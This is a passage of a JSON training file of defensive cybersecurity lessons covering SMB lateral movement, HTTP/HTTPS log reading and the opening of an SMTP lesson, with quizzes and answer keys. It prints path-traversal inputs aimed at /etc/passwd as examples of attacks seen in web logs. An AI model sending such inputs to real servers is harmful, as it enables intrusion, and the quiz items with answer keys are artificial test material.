          "label": "Investigate before connecting, because the presented host key no longer matches the trusted one, which can mean a rebuild or a man-in-the-middle attack.",
          "value": "b"
        },
        {
          "label": "Immediately reformat the local laptop, because a host key warning always means the administrator's own machine has been compromised by malware.",
          "value": "c"
        },
        {
          "label": "Switch the connection to Telnet instead, since Telnet does not check host keys and therefore avoids triggering this same warning entirely.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A host-key-changed warning means the key the server just presented no longer matches the one saved from earlier trusted connections; this can be an authorized server rebuild, but it can also mean traffic is being intercepted by an impostor machine, so the administrator must investigate the cause before connecting rather than clicking past it. Option a dismisses a warning that exists precisely to catch this risk. Option c wrongly blames the local machine instead of the server-identity mismatch. Option d proposes downgrading to insecure, plaintext Telnet, which is not a fix and removes protection entirely."
    }
  ],
  "references": [
    "https://www.rfc-editor.org/rfc/rfc4251",
    "https://www.ssh.com/academy/ssh/protocol",
    "https://attack.mitre.org/techniques/T1021/004/"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-smb-explained",
  "slug": "smb-explained-standalone",
  "title": "SMB Explained: Windows File Sharing and Lateral Movement",
  "topic": "Network Protocols",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When you open a shared drive at work, save a file to a team folder, or print to the office printer, a protocol called SMB is doing the work — and that same protocol is one of the most heavily abused in serious intrusions. This focused lesson covers SMB thoroughly: what it is and why Windows networks depend on it, how it works and on which ports, what SMB traffic and shares look like in practice, and why lateral movement, ransomware, and famous exploits like EternalBlue all revolve around this single file-sharing protocol.",
  "sections": [
    {
      "heading": "What SMB Is and Why Windows Networks Rely on It",
      "content": "**SMB** stands for **Server Message Block**. It is the protocol that lets computers — overwhelmingly Windows computers — share **files and printers** across a network, so that a folder sitting on a distant server appears and behaves as if it were on your own machine.\n\nThe real-life analogy is a **shared office filing cabinet**. Many people, each at their own desk, open the same cabinet, read documents, drop new ones in, and send jobs to the shared printer down the hall. SMB is what makes the department's shared drive appear as just another folder on everyone's computer.\n\nSMB is fundamental to how organisations work day to day. It is the machinery behind:\n\n- **Network drives and file shares** — the `\\\\FILESERVER\\HR` folders teams collaborate in.\n- **Shared printers** — sending a document to a printer across the network.\n- **Access to files on servers** — much of what Windows domains do for collaboration.\n\nA server **offers** named folders or printers, called **shares**, and clients connect to them subject to **permissions** that decide who may read or write. The address format `\\\\server\\share` — a **UNC path** (Universal Naming Convention) — is how SMB names a shared resource.\n\nBecause SMB is so central and so trusted, it is enabled and active on essentially every Windows network. That ubiquity is exactly why it is both indispensable to users and irresistible to attackers: file sharing is, from an intruder's point of view, also a ready-made way to *move* files and *reach* other machines. Understanding SMB is therefore understanding both how Windows collaboration works and where some of the most damaging attacks live."
    },
    {
      "heading": "How SMB Works: Shares, Permissions, and Port 445",
      "content": "SMB is a **client/server** protocol, and modern SMB runs directly over **TCP port 445**. (Older SMB used ports **137–139** together with NetBIOS; you may still see 139 referenced, but 445 is the modern standard.)\n\nThe basic exchange:\n\n1. **A server advertises shares.** A file server — or even an ordinary Windows PC — exposes one or more named **shares** (folders or printers) and enforces **permissions** on them.\n2. **A client connects** to the server on port 445 and requests access to a specific share by its UNC path.\n3. **The server checks the user's permissions** and, if allowed, lets the client browse, open, read, write, or delete files, and use printers.\n4. **The session continues** as the user works with the shared resource.\n\n**Behind the scenes**, two things matter for security. First, SMB access is tied to **authentication** — the user must be someone the server recognises and authorises, which is why SMB is deeply intertwined with Windows authentication (Kerberos/NTLM) and Active Directory. Second, SMB has evolved through versions (SMBv1, v2, v3), and the ancient **SMBv1** is dangerous and should be disabled — it is the version exploited by EternalBlue (below), and modern **SMBv3** adds encryption and stronger protections.\n\n**What it looks like in practice:** users rarely think about SMB directly; they just open `\\\\server\\share` in File Explorer, map a network drive (giving it a letter like `Z:`), or print. Administrators list and manage shares with tools and commands (`net share`, `net use`). On the network, SMB traffic is simply connections on port 445 between clients and servers — normal and constant in an office, which is precisely what lets malicious SMB blend in until you know what abnormal looks like."
    },
    {
      "heading": "SMB in the Real World: Files, Drives, and Admin Shares",
      "content": "To recognise SMB abuse, it helps to know what *normal* SMB looks like, including some built-in features attackers exploit.\n\n**Everyday SMB** is a workstation connecting to a handful of file servers on port 445 to reach team folders and printers — a stable, predictable pattern. Each user touches the shares their role needs, and the traffic stays between clients and known servers.\n\n**Administrative shares** are a crucial detail. Windows automatically creates hidden shares on every machine, notably **`C$`** (the entire C: drive) and **`ADMIN$`** (the Windows folder), reachable by administrators as `\\\\machine\\C$`. These exist for legitimate remote administration, but they are also exactly what attackers use to copy tools onto other machines and reach their file systems. Access to `C$`/`ADMIN$` across many machines from one source is a strong lateral-movement signal.\n\n**Mapped drives and UNC paths** are the visible face of SMB: the `Z:` drive that is really `\\\\FILESERVER\\Finance`, or a shortcut that opens a network folder. LNK files and Jump Lists (from the forensics track) often record these UNC paths, tying user activity to shared resources.\n\n### Tools that ride on SMB\n\nThe famous **PsExec** and similar administration tools work over SMB: they connect to a remote machine's admin share, copy a program, and start it as a service — legitimate for admins, and a favourite technique for attackers spreading through a network. Recognising that SMB underlies these tools explains why so much lateral movement appears as SMB activity.\n\nThe practical point is that SMB's everyday behaviour is narrow and predictable — a user reaching a few known shares — while its abuse is broad: one machine suddenly touching admin shares on dozens of others. Knowing the normal shape is what makes the abnormal, covered next, jump out."
    },
    {
      "heading": "SMB Versions and Signing: From SMBv1 to SMBv3",
      "content": "SMB has evolved through several major versions, and knowing where a network stands matters directly for security. **SMBv1**, the original version from the 1980s/90s, is old, inefficient, and — critically — the version containing the flaws exploited by EternalBlue and WannaCry. It should be disabled everywhere; modern Windows even disables it by default and only re-enables it for compatibility with legacy devices, which itself is worth flagging when found. **SMBv2**, introduced with Windows Vista, was a major rewrite that improved performance and dropped some of SMBv1's weaknesses. **SMBv3**, introduced with Windows 8/Server 2012, added **end-to-end encryption** for SMB traffic and further hardening, and is the version a well-secured modern network should be running exclusively.\n\n**SMB signing** is a separate, important protection worth understanding on its own. Signing adds a cryptographic signature to each SMB message so the recipient can verify it was not tampered with or replayed in transit. Without signing, SMB traffic is vulnerable to an **SMB relay attack**: an attacker intercepts an authentication attempt (often captured via a poisoning technique elsewhere on the network) and *relays* it to a different server, effectively logging in as the victim without ever knowing their password. Requiring SMB signing on servers — especially domain controllers — closes this off, because a relayed, unsigned message is rejected. Microsoft has moved toward requiring signing by default in recent Windows versions precisely because relay attacks remained a common technique in real intrusions for years.\n\nOne more legacy weakness worth knowing is the **null session** — an old SMB feature that let a connection authenticate as nobody ('anonymous') and still enumerate some information, such as usernames or share names, without any credentials at all. Modern Windows restricts this heavily by default, but older or misconfigured systems can still allow it, making anonymous share/user enumeration an easy early reconnaissance step for an attacker.\n\nFor a SOC, the practical checklist is short and concrete: **is SMBv1 disabled, is SMB signing enforced (particularly toward domain controllers), and are null sessions blocked?** These three configuration facts, more than almost anything else, determine how much SMB itself can be turned against the network."
    },
    {
      "heading": "Why SMB Matters to a SOC Analyst",
      "content": "SMB is one of the most heavily abused protocols in serious incidents, because the same features that make file sharing useful make it a superb vehicle for spreading and stealing. It deserves close SOC attention.\n\n**The major abuses:**\n\n- **Lateral movement.** Once inside, attackers use SMB to reach other machines — connecting to admin shares (`C$`/`ADMIN$`), copying tools, and executing them (the PsExec pattern). In telemetry this looks like **one machine rapidly connecting to many others on port 445**, often with administrative credentials. This fan-out is one of the most important patterns an analyst can recognise.\n- **Ransomware spread.** Ransomware uses SMB to reach and **encrypt shared drives across the whole organisation at once**, which is why a single infection can paralyse a company. Mass file modification across network shares is a hallmark.\n- **Exploits — EternalBlue / WannaCry.** The infamous **WannaCry** outbreak spread through an SMB vulnerability called **EternalBlue** (MS17-010) in the old **SMBv1** protocol, letting the worm move machine-to-machine automatically. This is the headline reason SMBv1 must be disabled and SMB patched.\n- **Credential and reconnaissance abuse.** Attackers use SMB to enumerate shares and, combined with weak configurations, to harvest or relay credentials (SMB is tied to NTLM authentication, enabling relay attacks).\n\n**What the SOC watches:**\n\n- **SMB traffic crossing network zones** — for example, a workstation reaching servers or other workstations it never normally touches on 445.\n- **One host connecting to many hosts on 445** — the lateral-movement fan-out.\n- **Access to admin shares** (`C$`, `ADMIN$`) from unexpected sources.\n- **Mass file operations** on shares (possible ransomware).\n- **Any SMBv1 traffic**, which should not exist in a hardened environment.\n\nThe analyst mindset is that **SMB is where a lot of an intrusion actually happens** — the moving, the spreading, the encrypting. Normal SMB is quiet and predictable; malicious SMB is a machine reaching where it should not. Learning that contrast turns port-445 telemetry from background noise into one of your best early warnings of an attacker moving through the network."
    },
    {
      "heading": "A Worked Example: Spotting Lateral Movement in SMB Logs",
      "content": "Imagine security event logs (Windows Event ID 5140, a network share was accessed) show the following, condensed, for one source host over four minutes:\n\n```\n14:02:11 5140 Share=\\\\WKS-114\\ADMIN$ Account=svc-backup Source=WKS-041\n14:02:14 5140 Share=\\\\WKS-119\\ADMIN$ Account=svc-backup Source=WKS-041\n14:02:19 5140 Share=\\\\WKS-122\\ADMIN$ Account=svc-backup Source=WKS-041\n14:02:23 5140 Share=\\\\SRV-DB01\\ADMIN$ Account=svc-backup Source=WKS-041\n14:02:26 5140 Share=\\\\SRV-DB01\\C$ Account=svc-backup Source=WKS-041\n```\n\nWalking through it: a single source, `WKS-041`, is reaching the hidden `ADMIN$` share on four different machines — three ordinary workstations and then a database server — in under fifteen seconds, using one account, `svc-backup`. Legitimate backup software does touch many machines, but it typically runs on a schedule against a known, fixed list of servers, not an ad hoc sequence ending at `C$` on a database server moments after touching regular workstations.\n\n**The questions an analyst asks here:** Is `svc-backup` actually the account that runs the organisation's backup software, and does its documented job normally include `WKS-041` as the *source* machine (backup traffic usually flows the other way, server-to-target, not workstation-to-everyone)? What process on `WKS-041` initiated these connections — was there a suspicious process, like a scripting engine or a remote-admin tool, running around 14:02? Did any file get written to `ADMIN$` or `C$` right after the connection — the follow-up step in a PsExec-style spread would be copying and then remotely starting an executable. And is `WKS-041` itself the true origin, or could it be a pivot point reached earlier from somewhere else in the environment?\n\nThe pattern itself — one source, many admin-share destinations, in a tight time window, using one set of credentials — is the fan-out signature described earlier in this lesson made concrete. Recognising it in four lines of raw log data, rather than only in the abstract, is exactly the skill this lesson is building."
    }
  ],
  "keyTakeaways": [
    "SMB (Server Message Block) is the protocol Windows networks use to share files and printers, exposing named shares reached by UNC paths (\\\\server\\share) under permissions; it runs over TCP port 445 (older SMBv1 used 137-139 with NetBIOS and should be disabled).",
    "SMB access is tied to Windows authentication (Kerberos/NTLM) and Active Directory; Windows auto-creates hidden administrative shares (C$ = whole C: drive, ADMIN$ = Windows folder) for remote admin that attackers heavily abuse.",
    "SMB is a top intrusion vehicle: lateral movement (one host connecting to many on 445, copying/running tools via admin shares, the PsExec pattern), ransomware spreading to encrypt network shares, and the EternalBlue/WannaCry exploit of SMBv1.",
    "SOC analysts hunt SMB crossing network zones, one-host-to-many fan-out on 445, access to C$/ADMIN$ from unexpected sources, mass file operations on shares, and any SMBv1 traffic — by contrasting the abnormal with normal, predictable SMB use.",
    "SMB has evolved from the dangerous legacy SMBv1 through SMBv2 to SMBv3 (which adds encryption); SMB signing prevents relay attacks by rejecting tampered/replayed messages, and null sessions (anonymous enumeration) should be blocked — disabled SMBv1, enforced signing, and blocked null sessions are the three configuration facts a SOC should verify."
  ],
  "quiz": [
    {
      "question": "During an incident you observe one workstation making SMB connections (port 445) to dozens of other machines within a few minutes, several reaching their C$ and ADMIN$ shares with administrative credentials. What does this pattern most strongly indicate?",
      "options": [
        {
          "label": "Normal file browsing, because a single user legitimately opens the hidden C$ administrative share on dozens of colleagues' machines during ordinary daily work.",
          "value": "a"
        },
        {
          "label": "Lateral movement: the attacker is using SMB and admin shares to reach and run tools on many machines, the classic PsExec-style spread through a network.",
          "value": "b"
        },
        {
          "label": "A DNS misconfiguration, because SMB fan-out on port 445 is the standard symptom of a name-resolution failure rather than any attacker activity.",
          "value": "c"
        },
        {
          "label": "Routine printing, because sending one document to the office printer requires opening the C$ and ADMIN$ shares on every workstation in the building.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "One host rapidly connecting to many others on port 445, reaching C$/ADMIN$ admin shares with administrative credentials, is the classic lateral-movement fan-out — the PsExec-style pattern of copying and running tools across machines. Option a is wrong because normal users do not open hidden admin shares on dozens of colleagues' machines. Option c misattributes an SMB pattern to DNS. Option d is false because printing does not require admin-share access on every workstation."
    },
    {
      "question": "The WannaCry ransomware spread automatically from machine to machine across networks in 2017. Which protocol and weakness did it exploit, and what is the key hardening lesson?",
      "options": [
        {
          "label": "It exploited SSH on port 22 by brute-forcing passwords, so the lesson is to enforce long passwords and disable root login on every server.",
          "value": "a"
        },
        {
          "label": "It exploited the EternalBlue vulnerability in the old SMBv1 protocol, so the lesson is to disable SMBv1 and keep SMB patched.",
          "value": "b"
        },
        {
          "label": "It exploited DHCP starvation on ports 67 and 68, so the lesson is to limit the address pool and monitor for exhausted leases on the network.",
          "value": "c"
        },
        {
          "label": "It exploited HTTPS on port 443 by breaking TLS encryption, so the lesson is to rotate certificates and disable older cipher suites everywhere.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "WannaCry spread using EternalBlue (MS17-010), a vulnerability in the legacy SMBv1 protocol, which let the worm move machine-to-machine automatically; the hardening lesson is to disable SMBv1 and keep SMB patched. Option a describes SSH brute force, unrelated to WannaCry's propagation. Option c describes a DHCP attack, not the SMB exploit used. Option d wrongly attributes it to breaking TLS on HTTPS."
    },
    {
      "question": "An attacker captures an SMB authentication attempt on the network and relays it unmodified to a different server, successfully logging in as the victim without ever learning their password. Which SMB protection is designed to prevent exactly this?",
      "options": [
        {
          "label": "SMB signing, because it cryptographically signs each message so a relayed or tampered message is rejected by the receiving server.",
          "value": "a"
        },
        {
          "label": "DHCP snooping, because it validates DHCP server traffic and therefore also blocks any relayed SMB authentication attempt on the network.",
          "value": "b"
        },
        {
          "label": "Anonymous null sessions, because disabling anonymous access automatically re-encrypts every SMB authentication message end to end.",
          "value": "c"
        },
        {
          "label": "UNC path hardening, because renaming the \\\\server\\share format prevents an attacker from ever relaying a captured authentication attempt.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "SMB signing adds a cryptographic signature to each message so the receiving server can detect a relayed or tampered message and reject it, which is exactly what defeats an SMB relay attack; Microsoft has moved to requiring signing by default for this reason. Option b misapplies DHCP snooping, an unrelated Layer 2 defense against rogue DHCP servers. Option c confuses null-session hardening (which limits anonymous enumeration) with signing/encryption. Option d invents a defense based on renaming UNC paths, which has no bearing on relay attacks."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview",
    "https://attack.mitre.org/techniques/T1021/002/",
    "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"
  ],
  "xp": 240,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-http-https-explained",
  "slug": "http-https-explained-standalone",
  "title": "HTTP and HTTPS Explained: The Web Protocol Analysts Read Most",
  "topic": "Network Protocols",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "The web runs on HTTP, and no protocol appears more often in a SOC analyst's logs. Every website visit, API call, and — crucially — a huge share of malware's command-and-control traffic is HTTP or its encrypted form, HTTPS. This focused lesson covers the web protocol from the ground up: what HTTP is, how a request and response are structured, the methods and status codes you will read constantly, how HTTPS adds encryption with TLS, what the traffic looks like, and why reading HTTP logs is one of the most important skills an analyst can build.",
  "sections": [
    {
      "heading": "What HTTP Is and How a Request Works",
      "content": "**HTTP** stands for **HyperText Transfer Protocol**. It is the protocol web browsers and servers use to exchange web pages, data, and files — the foundation of the World Wide Web. Every time you load a page or an app fetches data, HTTP is the conversation carrying it.\n\nHTTP is a **request/response** protocol running over **TCP port 80**. The model is simple: a **client** (your browser) sends a **request** to a **server**, and the server sends back a **response**. The real-life analogy is ordering at a counter: you make a specific request ('I'd like this'), and you get a specific response back ('here it is' — or 'we don't have that').\n\n**An HTTP request** has a recognisable structure:\n\n- A **method** — what action you want (see below).\n- A **URL/path** — which resource, e.g. `/login` or `/products?id=42`.\n- **Headers** — metadata about the request, such as the **User-Agent** (what client is asking — a browser, an app, or a script), the **Host**, cookies, and more.\n- Sometimes a **body** — data being sent, e.g. the contents of a submitted form.\n\n**The methods** you will see most:\n\n- **GET** — retrieve a resource (loading a page). Parameters ride in the URL.\n- **POST** — send data to the server (submitting a login or form). Data rides in the body.\n- **PUT / DELETE** — update or remove a resource (common in APIs).\n\nUnderstanding this anatomy matters because when you read a web log, you are reading exactly these fields — the method, the path, the User-Agent, the source. A request like `GET /admin/../../etc/passwd` or `POST /login` with hundreds of attempts tells a story the moment you can parse its parts. HTTP's simplicity and universality are precisely why it is everywhere in your logs — and why attackers hide inside it."
    },
    {
      "heading": "Status Codes and the Response",
      "content": "The server's **HTTP response** answers the request, and its most important element for an analyst is the **status code** — a three-digit number that says what happened. Reading status codes fluently is one of the fastest triage skills in web-log analysis.\n\nThe codes are grouped by their first digit:\n\n- **2xx — Success.** **200 OK** is the normal 'here is what you asked for.' A `200` on a sensitive resource means the request succeeded.\n- **3xx — Redirection.** **301/302** send the client elsewhere.\n- **4xx — Client error.** The request was wrong or not allowed. **404 Not Found** (the resource does not exist), **403 Forbidden** (not permitted), **401 Unauthorized** (authentication needed). Bursts of `404`s can be someone probing for hidden pages; bursts of `401/403` can be someone probing access controls.\n- **5xx — Server error.** **500 Internal Server Error** means the server itself failed — often when malformed or malicious input (like an injection attempt) breaks the backend.\n\nAlongside the status code, the response carries **headers** (metadata like content type and cookies) and usually a **body** (the actual page, data, or file).\n\n**Reading a log line** becomes a matter of assembling these: *at this time, this source sent this method to this path with this User-Agent, and got back this status code.* For example, a single IP sending many `POST /login` requests that mostly return `401` and then one `200` tells you a brute force likely succeeded; a burst of `404`s walking through `/admin`, `/backup`, `/wp-login` is reconnaissance; a `500` right after a strange quote character in a parameter hints at an injection attempt reaching the backend. The status code is your first, fastest filter for what deserves a closer look."
    },
    {
      "heading": "HTTPS: Adding Encryption with TLS",
      "content": "Plain HTTP has a serious problem: everything it sends — including passwords, session cookies, and personal data — travels as **readable text**. Anyone able to capture the traffic can read it. **HTTPS** solves this by adding encryption.\n\n**HTTPS** is simply HTTP running inside an encrypted **TLS** (Transport Layer Security) tunnel, on **TCP port 443**. The 'S' stands for Secure. TLS does three things:\n\n- **Encryption** — the HTTP request and response are scrambled so eavesdroppers see only ciphertext.\n- **Authentication** — a **certificate** proves the server is really who it claims (the padlock in your browser), preventing impostor sites.\n- **Integrity** — data cannot be secretly altered in transit.\n\n**How it starts:** before any HTTP is exchanged, the client and server perform a **TLS handshake** — they agree on encryption and the server presents its certificate, which the client validates (checking it is issued by a trusted authority and matches the site). Only then does the encrypted HTTP conversation flow. (This connects to the certificates concept from the cryptography lesson.)\n\n**What this means for an analyst is critical:** with HTTPS, the *content* of the request and response is encrypted, so a network monitor can no longer read the URL path, headers, or body the way it can with plain HTTP. But — and this is the key insight — the **metadata remains visible**: which client talked to which server, when, for how long, how much data moved, and the destination IP and (often) the domain name via the certificate/SNI. This is why, in an HTTPS world, analysts increasingly rely on **endpoint logs** (where the browser or app records the full URL before encryption) and on **metadata and TLS fingerprinting** rather than reading packet contents. HTTPS protects users' privacy and security — and also lets attackers hide their command-and-control inside encryption, which is exactly the tension the SOC must work within."
    },
    {
      "heading": "Cookies, Sessions, and Why Web Authentication Matters to Analysts",
      "content": "HTTP itself has an important quirk: it is **stateless** — every single request is handled independently, with no built-in memory of previous ones. Without something extra, a website would have no way to know that the person clicking 'add to cart' is the same person who just logged in a moment ago, because each HTTP request arrives fresh, with no memory attached.\n\nThe fix is the **cookie**: a small piece of data the server asks the browser to store (via a `Set-Cookie` response header) and then send back automatically with every subsequent request to that site (in a `Cookie` request header). After you log in, the server gives your browser a **session cookie** — often a long, random **session token** — and from then on, every request you make silently includes that token, letting the server recognise 'this is the same logged-in user' without you re-entering your password each time.\n\nThis is exactly why cookies and session tokens are high-value targets. If an attacker can steal your session cookie — through malware on your machine, a cross-site-scripting flaw in a website, or by intercepting unencrypted HTTP traffic — they can present that same token to the server and be treated as *you*, fully logged in, without ever knowing your password. This is called **session hijacking**, and it is one of the most direct consequences of the request/response, cookie-based design covered in this section.\n\nHTTPS substantially reduces this risk for the interception scenario, since an encrypted channel prevents a network eavesdropper from simply reading the cookie off the wire — one more reason plain HTTP for anything involving login is unacceptable. But it does not eliminate the risk entirely: malware on the endpoint or a scripting flaw in the site itself can still steal a valid session token even over HTTPS.\n\nFor an analyst, the practical relevance is that **web/proxy logs recording cookie or session-token reuse from an unexpected IP or device, immediately after a legitimate login elsewhere, is a hijacking indicator** — the same account, the same session, suddenly used from somewhere it shouldn't be. This is also why security teams flag unusually long-lived sessions, and why 'log out' really does matter: it invalidates the token server-side, closing the window an attacker could otherwise reuse."
    },
    {
      "heading": "Why HTTP/HTTPS Matters to a SOC Analyst",
      "content": "HTTP and HTTPS are, for most analysts, the single most-read protocol — because the web is where both legitimate activity and a huge amount of attack activity live. Two very different angles matter.\n\n### 1. Web attacks against your servers (reading inbound HTTP)\n\nWeb server and WAF logs record every request hitting your applications, and attackers' probes appear right there in the method, path, and parameters:\n\n- **Injection and web attacks** — SQL injection, cross-site scripting, path traversal (`../../etc/passwd`), and command injection show up as suspicious payloads in URLs and bodies, often followed by `500` errors or unexpected `200`s.\n- **Reconnaissance** — bursts of `404`s walking through admin paths, or scanning User-Agents (like `sqlmap` or `nikto`), reveal someone mapping your site.\n- **Credential attacks** — many `POST /login` attempts with `401`s indicate brute force or credential stuffing.\n\n(The OWASP Top 10 and web-attack lessons go deeper; the point here is that these attacks are *read in HTTP logs*.)\n\n### 2. Malware using the web to communicate (outbound HTTP/HTTPS)\n\nThis is often the more important angle. Attackers love HTTP/HTTPS for **command-and-control** and **exfiltration** because it blends in — port 443 traffic is everywhere and usually allowed out through firewalls. Analysts hunt for:\n\n- **Beaconing** — a machine making small, regular HTTP/HTTPS requests to the same external destination on a schedule (malware phoning home).\n- **Suspicious destinations** — connections to newly-registered domains, known-bad hosts, or unusual User-Agents that do not match a real browser.\n- **Data exfiltration** — unusually large outbound POSTs or transfers to unfamiliar servers.\n- **TLS anomalies** — with HTTPS hiding content, analysts use **TLS/JA3 fingerprinting** and certificate oddities to spot malicious tools even without seeing the payload.\n\nThe unifying analyst skill is to read HTTP as a language: parse the method, path, status, and User-Agent for inbound attacks, and watch destination, regularity, and volume for outbound C2. Because so much of both normal work and modern malware speaks HTTP/HTTPS, fluency here — knowing what a benign request looks like versus a probe or a beacon — is one of the highest-leverage capabilities a SOC analyst can develop."
    },
    {
      "heading": "A Worked Example: Reading a Web Server Access Log Line by Line",
      "content": "Most web servers write access logs in a very standard, dense format. Here is one real line:\n\n```\n203.0.113.77 - - [16/Aug/2026:03:14:09 +0000] \"POST /login HTTP/1.1\" 401 512 \"-\" \"python-requests/2.31\"\n```\n\nBreaking it into every field, left to right: `203.0.113.77` is the **source IP** making the request. The two dashes are unused identity fields (rarely populated). `[16/Aug/2026:03:14:09 +0000]` is the **timestamp**. `\"POST /login HTTP/1.1\"` is the **request line** — the method (`POST`), the path (`/login`), and the HTTP version. `401` is the **status code** — Unauthorized, meaning the login attempt failed. `512` is the size, in bytes, of the response sent back. `\"-\"` is the **referrer** (empty here — nothing linked to this request). And `\"python-requests/2.31\"` is the **User-Agent** — critically, this is *not* a real browser; it is a Python scripting library, which is exactly the tool an automated credential-stuffing script would use.\n\nNow imagine this exact line repeated 400 times in one minute, each with a different password guess against the same `/login` path, all from the same `python-requests` User-Agent, all returning `401` — and then one line finally returns `200`. **Reading the pattern is now mechanical**: source IP, dense repetition, non-browser User-Agent, and a status-code shift from failure to success is the same brute-force signature this lesson has described throughout, just visible in the actual raw text of a log rather than described abstractly.\n\nThe field-by-field habit — source, time, method, path, status, User-Agent — is the one skill that makes any web log readable, whether it comes from Apache, Nginx, IIS, a cloud load balancer, or a WAF. Every one of those platforms records roughly this same information, sometimes with different field names, but always answering the same underlying question: who asked for what, and what happened."
    }
  ],
  "keyTakeaways": [
    "HTTP (HyperText Transfer Protocol, TCP port 80) is the web's request/response protocol; a request carries a method (GET retrieve, POST send data, PUT/DELETE), a URL/path, headers (like User-Agent), and sometimes a body.",
    "HTTP responses carry a status code that is the analyst's fastest triage signal: 2xx success (200 OK), 3xx redirect, 4xx client error (404 not found, 403 forbidden, 401 unauthorized), 5xx server error (500, often from malformed/injection input).",
    "HTTPS is HTTP inside an encrypted TLS tunnel on TCP port 443, adding encryption, certificate-based server authentication, and integrity via a TLS handshake; content becomes unreadable to network monitors but metadata (who/when/how much/destination) stays visible, pushing analysts toward endpoint logs and TLS fingerprinting.",
    "SOC analysts read HTTP two ways: inbound web logs reveal injection, path traversal, recon (404 bursts, scanner User-Agents), and login brute force; outbound HTTP/HTTPS reveals C2 beaconing, suspicious destinations, exfiltration, and TLS/JA3 anomalies — since malware hides in ubiquitous, firewall-allowed web traffic.",
    "HTTP is stateless, so sites use cookies/session tokens (set via Set-Cookie, sent back via the Cookie header) to recognise a logged-in user across requests; stealing that token enables session hijacking, which is why HTTPS, short-lived sessions, and proper logout matter, and why reused tokens from unexpected sources are a SOC red flag."
  ],
  "quiz": [
    {
      "question": "In web server logs you see one external IP send hundreds of GET requests within a minute to paths like /admin, /backup, /wp-login.php, and /phpmyadmin, almost all returning 404 Not Found. What does this pattern indicate?",
      "options": [
        {
          "label": "A successful data exfiltration, because stealing data always appears as a rapid series of GET requests to common admin paths that all return 404 errors.",
          "value": "a"
        },
        {
          "label": "Reconnaissance: the attacker is probing for hidden or vulnerable pages, and the burst of 404s shows most guessed paths do not exist on the server.",
          "value": "b"
        },
        {
          "label": "Normal user browsing, because a person loading a single web page legitimately requests hundreds of different admin URLs that return 404 in under a minute.",
          "value": "c"
        },
        {
          "label": "A TLS handshake failure, because HTTPS certificate errors are recorded in web logs as a rapid sequence of 404 responses to administrative URL paths.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A burst of requests walking through common admin/CMS paths that mostly return 404 is classic reconnaissance — the attacker is guessing for hidden or vulnerable pages, and the 404s show those paths do not exist. Option a wrongly ties this recon pattern to exfiltration, which is outbound and large, not 404-heavy probing. Option c is false because normal browsing does not request hundreds of admin URLs. Option d misattributes a TLS problem to 404 status codes."
    },
    {
      "question": "Your organisation uses HTTPS everywhere, so a network sensor can no longer read the URLs and content of web traffic. Why can analysts still detect malware command-and-control, and what do they rely on?",
      "options": [
        {
          "label": "They cannot detect anything once HTTPS is used, because TLS encryption removes every possible signal, so C2 over port 443 is completely undetectable.",
          "value": "a"
        },
        {
          "label": "HTTPS hides content but not metadata, so analysts use destination, timing/regularity, data volume, endpoint logs, and TLS/JA3 fingerprinting to spot C2.",
          "value": "b"
        },
        {
          "label": "HTTPS automatically blocks all malware, so any traffic that reaches port 443 is guaranteed safe and requires no monitoring or investigation at all.",
          "value": "c"
        },
        {
          "label": "Analysts simply decrypt all TLS traffic instantly without any keys, because HTTPS encryption can be reversed by any network sensor on demand.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "TLS encrypts the content of HTTPS but leaves metadata visible — which client talked to which server, when, how often, how much data, and the destination — so analysts detect C2 through beaconing regularity, suspicious destinations, volume, endpoint logs that see the full URL pre-encryption, and TLS/JA3 fingerprinting. Option a overstates the loss of visibility. Option c falsely claims HTTPS blocks malware. Option d is wrong because TLS cannot be decrypted without keys."
    },
    {
      "question": "An attacker uses a cross-site scripting flaw to steal a logged-in user's session cookie, then submits that exact cookie value to the same website from a completely different device. What happens, and why is this dangerous?",
      "options": [
        {
          "label": "Nothing happens, because HTTP is stateless and therefore no cookie value can ever be reused to represent a previously authenticated user.",
          "value": "a"
        },
        {
          "label": "The server treats the attacker as the logged-in user, because the session cookie alone proves identity to a stateless protocol — session hijacking.",
          "value": "b"
        },
        {
          "label": "The website automatically blocks the request, because servers always detect a cookie being sent from a new device and reject it outright.",
          "value": "c"
        },
        {
          "label": "The attacker only sees the public homepage, because session cookies never grant access to any authenticated pages under any circumstances.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Because HTTP is stateless, the server relies on the session cookie/token alone to recognise a logged-in user; if an attacker obtains a valid cookie, presenting it makes the server treat them as that user without needing a password — this is session hijacking, and it is exactly why protecting and limiting the lifetime of session tokens matters. Option a misunderstands statelessness, which is precisely why cookies were invented to bridge the gap. Option c overstates default protections; not all servers detect this automatically. Option d is false because a valid session cookie is exactly what grants access to authenticated pages."
    }
  ],
  "references": [
    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview",
    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Status",
    "https://attack.mitre.org/techniques/T1071/001/"
  ],
  "xp": 230,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-smtp-explained",
  "slug": "smtp-explained-standalone",
  "title": "SMTP Explained: How Email Travels and Gets Forged",
  "topic": "Network Protocols",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Email is the number-one delivery vehicle for attacks, so the protocol that moves email — SMTP — is one every SOC analyst should understand in depth. This focused lesson covers SMTP from the ground up: what it is and its one specific job, how a message travels from sender to recipient, the ports involved, what the conversation actually looks like, why email is so easy to forge, and how SMTP knowledge underpins investigating phishing and business email compromise.",
  "sections": [
    {
      "heading": "What SMTP Is and Its One Job",
